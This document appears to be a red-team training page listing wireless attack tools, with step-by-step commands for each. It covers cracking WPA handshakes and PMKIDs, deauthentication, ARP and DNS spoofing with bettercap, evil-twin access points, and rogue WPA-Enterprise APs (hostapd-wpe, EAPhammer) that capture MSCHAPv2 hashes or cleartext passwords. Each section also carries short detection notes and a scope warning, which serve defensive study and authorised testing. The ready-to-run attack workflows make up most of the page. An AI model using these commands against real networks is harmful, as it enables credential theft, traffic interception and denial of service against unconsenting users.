---
layout: training-page
title: "Wireless Attack Tools — Red Team Academy"
module: "Red Team Tools"
tags:
  - wireless
  - wifi
  - aircrack
  - bettercap
page_key: "tools-wireless"
render_with_liquid: false
---

# Wireless Attack Tools

Tools for attacking Wi-Fi networks, capturing WPA handshakes, creating evil twins, and performing
    rogue access point attacks. Hardware requirements and legal scope considerations are critical.

⚠ Wireless attacks require hardware with monitor mode and packet injection capability.
    Recommended adapters: Alfa AWUS036ACH, Alfa AWUS036ACM, Alfa AWUS036ACHM (2.4+5GHz).
    Always confirm engagement scope covers wireless testing.

 AIRCRACK-NG SUITE 

## // Aircrack-ng Suite

The foundational Wi-Fi auditing suite. Provides monitor mode management (airmon-ng), packet capture (airodump-ng), deauthentication/injection attacks (aireplay-ng), and offline WPA/WEP cracking (aircrack-ng).

### Install

```
sudo apt install aircrack-ng
# Verify card supports injection
sudo airmon-ng check
sudo aireplay-ng --test wlan0
```

### WPA2 Handshake Capture Workflow

```
# Step 1: Enable monitor mode
sudo airmon-ng check kill        # kill interfering processes
sudo airmon-ng start wlan0       # creates wlan0mon

# Step 2: Scan for networks
sudo airodump-ng wlan0mon

# Step 3: Target specific network (from scan output)
# BSSID = AP MAC, CH = channel, ESSID = network name
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step 4: Deauthenticate client to force re-handshake (new terminal)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
# -a = AP BSSID, -c = client MAC, omit -c for broadcast deauth

# Step 5: Wait for WPA handshake (shown in airodump-ng top right)
# File saved as capture-01.cap

# Step 6: Crack with aircrack-ng (offline)
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Step 7: Crack with hashcat (faster — GPU)
# Convert to hc22000 format first
hcxpcapngtool -o capture.hc22000 capture-01.cap
hashcat -m 22000 capture.hc22000 rockyou.txt
```

### WPA3 / PMKID Attack (clientless)

```
# No deauth needed — request PMKID from AP directly
# Requires hcxdumptool + hcxtools

# Capture PMKID
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert and crack
hcxpcapngtool -o pmkid.hc22000 capture.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

### WEP Cracking (legacy networks)

```
# Capture IVs (need ~50,000 IVs for WEP 64-bit)
sudo airodump-ng -c 6 --bssid AP_MAC -w wep-capture wlan0mon

# Speed up IV collection with fake authentication + ARP replay
sudo aireplay-ng -1 0 -a AP_MAC wlan0mon           # fake auth
sudo aireplay-ng -3 -b AP_MAC wlan0mon              # ARP replay

# Crack
aircrack-ng wep-capture-01.cap
```

### Detections

- Deauthentication frames: 802.11w (Management Frame Protection / MFP) prevents deauth attacks on protected networks
- WIDS (Wireless Intrusion Detection): deauth flood, rogue AP detection, client association anomalies
- Enterprise APs (Cisco, Aruba): built-in WIDS alerts on deauth storms
- PMF-enabled networks: deauth attacks fail silently
- Physical: RF monitoring stations can locate transmitting adapters

---

 HCXTOOLS / HCXDUMPTOOL 

## // Hcxtools / Hcxdumptool

Modern WPA/WPA2/WPA3 capture tools. hcxdumptool captures PMKID, handshakes, and EAPOL frames without deauth. hcxtools converts captures to hashcat format. The current standard for Wi-Fi credential capture.

### Install

```
sudo apt install hcxtools hcxdumptool
```

### Common Usage

```
# Capture everything (PMKIDs + handshakes)
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=3

# Target specific BSSIDs
sudo hcxdumptool -i wlan0mon -o capture.pcapng \
  --filterlist_ap=target-bssids.txt --filtermode=2

# Run for 10 minutes
sudo timeout 600 hcxdumptool -i wlan0mon -o capture.pcapng

# Convert to hashcat format (hc22000)
hcxpcapngtool -o hashes.hc22000 capture.pcapng

# Extract summary info
hcxpcapngtool -E essidlist -I identitylist -U usernamelist capture.pcapng

# Crack with hashcat
hashcat -m 22000 hashes.hc22000 rockyou.txt -r best64.rule

# Show network info from capture
hcxdumptool --info capture.pcapng

# Filter by ESSID
hcxpcapngtool -o filtered.hc22000 capture.pcapng -E "TargetNetwork"
```

### Detections

- hcxdumptool sends probe requests and association frames — visible in WIDS
- Rogues association attempts logged by enterprise APs
- PMKID capture requires association attempt — logged by AP
- PMF (802.11w) reduces effectiveness but doesn't completely prevent PMKID capture

---

 BETTERCAP 

## // Bettercap

Swiss-army knife for network attacks. Written in Go. Supports ARP spoofing/MitM, DNS spoofing, Wi-Fi evil twin attacks, BLE scanning, caplets (automation scripts), and a web UI. Replaces ettercap for modern engagements.

### Install

```
sudo apt install bettercap
# Update modules
sudo bettercap -eval "caplets.update; ui.update; q"
```

### Common Usage

```
# Start with web UI
sudo bettercap -iface eth0 -caplet http-ui
# Access at http://127.0.0.1/

# ARP spoofing (MitM on LAN)
sudo bettercap -iface eth0
> net.probe on          # discover hosts
> set arp.spoof.targets 192.168.1.0/24  # or specific IP
> arp.spoof on
> net.sniff on          # capture traffic

# DNS spoofing (redirect specific domains)
> set dns.spoof.domains example.com,*.evil.com
> set dns.spoof.address 192.168.1.5
> dns.spoof on

# Evil Twin / Rogue AP
sudo bettercap -iface wlan0mon
> set wifi.ap.ssid "CorporateWiFi"
> set wifi.ap.bssid de:ad:be:ef:00:01
> set wifi.ap.channel 6
> wifi.recon on         # discover nearby clients
> wifi.deauth AP_BSSID  # deauth from real AP
> wifi.ap on            # start rogue AP

# WPA handshake capture
> wifi.recon on
> wifi.deauth AA:BB:CC:DD:EE:FF  # deauth all clients from AP

# HTTP credential capture (on rogue AP)
> net.sniff on
> set net.sniff.filter tcp port 80

# Caplet automation
sudo bettercap -caplet /usr/share/bettercap/caplets/pita.cap

# BLE scanning
> ble.recon on
> ble.show
```

### Detections

- ARP spoofing: duplicate ARP replies from different MACs — ARP inspection on managed switches prevents this
- Evil twin: WIDS detects duplicate SSIDs with different BSSIDs
- DNS spoofing: DNSSEC-validated clients reject forged responses
- Hosts with static ARP entries or ARP monitoring tools (XArp) detect ARP poisoning
- 802.11w (MFP): prevents deauth from rogue AP

---

 HOSTAPD-WPE 

## // Hostapd-WPE (WPA Enterprise Rogue AP)

Modified hostapd that creates a rogue WPA Enterprise access point. Captures MSCHAPV2 credentials when users connect to the fake enterprise Wi-Fi. Critical for attacking corporate WPA2-Enterprise environments.

### Install

```
sudo apt install hostapd-wpe
```

### Setup & Usage

```
# Configuration file (hostapd-wpe.conf)
interface=wlan0
driver=nl80211
ssid=CorporateWiFi          # same as target SSID
channel=6
hw_mode=g
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
wpe_logfile=hostapd-wpe.log

# Generate certificates (use a convincing CN)
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.pem -days 365 \
  -subj "/C=US/ST=CA/O=Corporate IT/CN=CorporateWiFi-Radius"

# Start rogue AP
sudo hostapd-wpe hostapd-wpe.conf

# Monitor captured credentials
tail -f hostapd-wpe.log
# Output: username and NTLMv1/NTLMv2 challenge-response

# Crack captured hash with asleap
asleap -C challenge -R response -W rockyou.txt

# Or hashcat (NetNTLMv1-VANILLA hash)
hashcat -m 5500 captured-hash.txt rockyou.txt
```

### Full Attack Workflow

```
# 1. Identify target SSID and channel
sudo airodump-ng wlan0mon | grep WPA

# 2. Create matching rogue AP with hostapd-wpe
# Ensure SSID matches exactly

# 3. Deauth clients from real AP (optional — often connects due to stronger signal)
sudo aireplay-ng --deauth 0 -a REAL_AP_BSSID wlan0mon

# 4. Client connects to rogue AP, credentials captured in log

# 5. Crack credentials or use for PTH/relay
```

### Detections

- Clients with CA certificate pinned to real RADIUS server reject rogue cert
- WIDS: duplicate SSID with different BSSID detected as evil twin
- Enterprise MDM: device policy can enforce specific RADIUS CA certificate
- 802.1X: EAP-TLS (certificate-based auth) is immune — only credentials-based methods (PEAP-MSCHAPv2) are vulnerable

---

 KISMET 

## // Kismet

Passive 802.11 network detector, sniffer, and IDS. Detects networks, devices, and anomalies without transmitting. Also captures Bluetooth, Zigbee, and other RF protocols with appropriate hardware. Used for passive recon and building a full wireless picture.

### Install

```
sudo apt install kismet
```

### Common Usage

```
# Start with web UI
sudo kismet -c wlan0mon
# Access at http://127.0.0.1:2501

# CLI mode
sudo kismet -c wlan0mon --daemonize

# Multiple interfaces (dual-band monitoring)
sudo kismet -c wlan0mon,wlan1mon

# Channel hopping (default) vs fixed channel
sudo kismet -c wlan0mon:channel=6

# GPS integration (wardriving)
sudo kismet -c wlan0mon --gps gpsd://localhost:2947

# Export data
# Via web API: http://localhost:2501/devices/views/all.json
# Or: kismetdb_to_wigle.py for WiGLE import

# PCAP capture
sudo kismet -c wlan0mon -f /tmp/kismet-capture.pcapng

# Filter for specific SSIDs
sudo kismet -c wlan0mon --filter-ssid "CorporateWiFi"
```

### Detections

- Kismet is fully passive — no transmission, no detection possible from RF monitoring
- Physical presence required (within RF range)
- Best used for pre-engagement recon to map wireless landscape

---

 EAP-HAMMER 

## // EAP-Hammer / EAP Attacks

Tools for attacking WPA Enterprise networks beyond basic rogue AP. EAPhammer automates complex EAP-based attacks including GTC downgrade, identity disclosure, and MSCHAPV2 capture.

### EAPhammer Setup

```
# Install
git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer && sudo python3 eaphammer --install

# Generate certificates
./eaphammer --cert-wizard

# Rogue AP for MSCHAPV2 capture
sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap \
  --essid CorporateWiFi --creds

# GTC downgrade attack (captures cleartext passwords)
sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap \
  --essid CorporateWiFi --creds --negotiate gtc-downgrade
```

### WPA Enterprise Attack Summary

| EAP Method | Vulnerable? | Capture | Mitigation |
| --- | --- | --- | --- |
| PEAP-MSCHAPv2 | YES | NTLMv1 hash (crackable) | Pin RADIUS CA cert |
| EAP-TTLS/PAP | YES | Plaintext password | Pin RADIUS CA cert |
| EAP-TLS | NO | Cert-based — immune | Use EAP-TLS |
| EAP-FAST | PARTIAL | PAC provisioning phase | Use mutual auth |
